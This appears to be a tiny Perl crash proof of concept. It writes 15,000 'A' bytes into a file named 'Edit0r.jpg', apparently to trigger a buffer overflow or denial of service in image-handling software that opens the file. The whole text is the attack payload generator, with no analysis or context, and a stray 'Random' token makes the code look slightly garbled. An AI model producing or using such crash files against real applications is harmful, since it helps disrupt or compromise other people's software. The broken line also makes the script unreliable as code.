#!/usr/bin/perl
my $crash="\x41" x 15000 ; Random
open(myfile,'>>Edit0r.jpg');
print myfile $crash;
print "File Created successfully\n";
